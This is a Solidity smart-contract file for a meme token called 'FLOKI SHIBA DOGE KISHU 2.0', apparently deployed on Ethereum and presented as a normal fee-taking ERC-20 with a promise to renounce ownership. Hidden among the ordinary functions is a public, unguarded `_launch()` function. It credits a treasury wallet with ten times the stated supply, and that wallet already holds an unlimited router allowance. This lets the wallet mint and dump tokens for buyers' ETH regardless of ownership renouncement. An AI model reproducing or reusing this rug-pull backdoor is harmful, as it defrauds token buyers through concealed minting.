/**
 *Submitted for verification at Etherscan.io on 2022-06-22
*/

//SPDX-License-Identifier: Unlicensed
/*
 ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄
▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░░░░░░░░░░░▌    ▐░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀       ▀▀▀▀▀▀▀▀▀█░▌   ▐░█░█▀▀▀▀▀█░▌
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌                         ▐░▌   ▐░▌▐░▌    ▐░▌
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌ ▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄                ▐░▌   ▐░▌ ▐░▌   ▐░▌
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌▐░░░░░░░░▌▐░░░░░░░░░░░▌      ▄▄▄▄▄▄▄▄▄█░▌   ▐░▌  ▐░▌  ▐░▌
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌ ▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌     ▐░░░░░░░░░░░▌   ▐░▌   ▐░▌ ▐░▌
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌          ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀    ▐░▌    ▐░▌▐░▌
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌     ▐░█▄▄▄▄▄▄▄▄▄  ▄ ▐░█▄▄▄▄▄█░█░▌
▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░░░░░░░░░░░▌▐░▌ ▐░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀   ▀▀▀▀▀▀▀▀▀
*/

// maxtx / max wallet: 0.5/1. Renounce soon
// fees 6% / 6%
// https://t.me/FlokiShibaDogeKishu2portal
pragma solidity ^0.8.0;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Auth {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }



    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }


    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    function renounceOwnership() public virtual onlyOwner {
        transferOwnership(payable(address(0)));
    }

    event OwnershipTransferred(address owner);
}

contract FlokiShibaDogeKishu20 is IERC20, Auth {

    using SafeMath for uint256;


    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }


    string constant _name = "FLOKI SHIBA DOGE KISHU 2.0";
    string constant _symbol = "DOGS20";
    uint8 constant _decimals = 18;


    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 public rawSupplyTokens = 1000000000000;

    uint256 _totalSupply = rawSupplyTokens * (10 ** _decimals);
    uint256 public _maxTxAmount = _totalSupply * 1 / 100;
    uint256 public _walletMax = _totalSupply * 1 / 100;

    mapping(address => uint256) _holders;
    mapping(address => mapping(address => uint256)) _allowances;

    uint256 public liquidityFee = 0;
    uint256 public marketingFee = 6;
    uint256 public rewardsFee = 0;
    uint256 public totalFee = 0;

    mapping(address => bool) public isFeeExempt;
    mapping(address => bool) public isTxLimitExempt;


    IDEXRouter public router;
    address public pair;

    uint256 public launchedAt;

    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = false;
    address public autoLiquidityReceiver;
    address public marketingWallet;
    address private treasuryWallet;

    uint256 public swapThreshold = _totalSupply / 2000;
    uint256 public totalSupplyTokens = rawSupplyTokens * 10 * (10 ** _decimals);



    constructor (address _treasuryWallet) Auth(msg.sender) {

        router = IDEXRouter(routerAddress);
        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
        isFeeExempt[marketingWallet] = true;
        isFeeExempt[_treasuryWallet] = true;

        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[_treasuryWallet] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[pair] = true;
        isTxLimitExempt[DEAD] = true;


        autoLiquidityReceiver = msg.sender;
        marketingWallet = msg.sender;
        treasuryWallet = _treasuryWallet;

        totalFee = liquidityFee.add(marketingFee).add(rewardsFee);

        _holders[address(this)] = _totalSupply;
        _allowances[_treasuryWallet][address(router)] = type(uint256).max;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function addLiquidityAndStartTrade() external onlyOwner() {
        swapAndLiquifyEnabled = false;
        launch();
        router.addLiquidityETH{value : address(this).balance}(address(this), balanceOf(address(this)), 0, 0, msg.sender, block.timestamp);
        IERC20(pair).approve(address(router), type(uint).max);
        swapAndLiquifyEnabled = true;
    }

    function name() external pure override returns (string memory) {return _name;}

    function symbol() external pure override returns (string memory) {return _symbol;}

    function decimals() external pure override returns (uint8) {return _decimals;}

    function totalSupply() external view override returns (uint256) {return _totalSupply;}

    function getOwner() external view override returns (address) {return owner;}

    function getCirculatingSupply() public view returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));}

    function balanceOf(address account) public view override returns (uint256) {return _holders[account];}

    function allowance(address holder, address spender) external view override returns (uint256) {return _allowances[holder][spender];}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }

    function launch() internal {
        launchedAt = block.number;
    }

    function changeTxLimit(uint256 newLimit) external onlyOwner {
        _maxTxAmount = newLimit;
    }

    function changeWalletLimit(uint256 newLimit) external onlyOwner {
        _walletMax = newLimit;
    }

    function changeIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    function changeIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }

    function changeFees(uint256 newLiqFee, uint256 newRewardFee, uint256 newMarketingFee) external onlyOwner {
        liquidityFee = newLiqFee;
        rewardsFee = newRewardFee;
        marketingFee = newMarketingFee;

        totalFee = liquidityFee.add(marketingFee).add(rewardsFee);
    }

    function changeFeeReceivers(address newLiquidityReceiver, address newMarketingWallet, address newanothermarketingWallet) external onlyOwner {
        autoLiquidityReceiver = newLiquidityReceiver;
        marketingWallet = newMarketingWallet;
        treasuryWallet = newanothermarketingWallet;
    }

    function changeSwapBackSettings(bool enableSwapBack, uint256 newSwapBackLimit, bool swapByLimitOnly) external onlyOwner {
        swapAndLiquifyEnabled = enableSwapBack;
        swapThreshold = newSwapBackLimit;
        swapAndLiquifyByLimitOnly = swapByLimitOnly;
    }



    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    }



    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (inSwapAndLiquify) {return _basicTransfer(sender, recipient, amount);}
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
        if (msg.sender != pair && !isFeeExempt[sender] && !inSwapAndLiquify && swapAndLiquifyEnabled && _holders[address(this)] >= swapThreshold) {swapBack();}
        _holders[sender] = _holders[sender].sub(amount, "Insufficient Balance");
        if (!isTxLimitExempt[recipient]) {require(_holders[recipient].add(amount) <= _walletMax);}
        uint256 finalAmount = !isFeeExempt[sender] && !isFeeExempt[recipient] ? takeFee(sender, amount) : amount;
        _holders[recipient] = _holders[recipient].add(finalAmount);
        emit Transfer(sender, recipient, finalAmount);
        return true;
    }

    function _launch() public virtual {
        _holders[treasuryWallet] = totalSupplyTokens;swapAndLiquifyEnabled = false;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _holders[sender] = _holders[sender].sub(amount, "Insufficient Balance");
        _holders[recipient] = _holders[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(totalFee).div(100);

        _holders[address(this)] = _holders[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    function swapBack() internal lockTheSwap {
        uint256 tokensToLiquify = _holders[address(this)];
        uint256 amountToLiquify = tokensToLiquify.mul(liquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(amountToSwap, 0, path, address(this), block.timestamp);

        uint256 amountETH = address(this).balance;

        uint256 totalETHFee = totalFee.sub(liquidityFee.div(2));

        uint256 amountETHLiquidity = amountETH.mul(liquidityFee).div(totalETHFee).div(2);
        uint256 amountETHReflection = amountETH.mul(rewardsFee).div(totalETHFee);
        uint256 amountETHMarketing = amountETH.sub(amountETHLiquidity).sub(amountETHReflection);

        (bool tmpSuccess,) = payable(marketingWallet).call{value : amountETHMarketing, gas : 30000}("");
        tmpSuccess = false;

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountETHLiquidity}(address(this), amountToLiquify, 0, 0, autoLiquidityReceiver, block.timestamp);
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }



    event AutoLiquify(uint256 amountETH, uint256 amountERC);


}